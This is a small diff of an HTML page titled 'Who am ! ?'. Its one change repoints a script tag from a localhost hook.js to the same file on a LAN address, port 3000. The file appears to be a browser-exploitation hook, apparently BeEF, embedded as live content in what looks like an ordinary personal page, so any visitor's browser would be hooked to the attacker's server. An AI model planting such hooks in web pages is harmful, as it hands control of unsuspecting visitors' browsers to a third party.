@@ -3,7 +3,7 @@
 <title>Who am ! ? </title>
 <link rel="stylesheet" href="CSS/style.css">
 <link rel="icon" href="Image/J.PNG">
-<script src="http://127.0.0.1:3000/hook.js"></script>
+<script src="http://192.168.0.108:3000/hook.js"></script>
 </head>
 
 <body bgcolor="#1C1C1C">
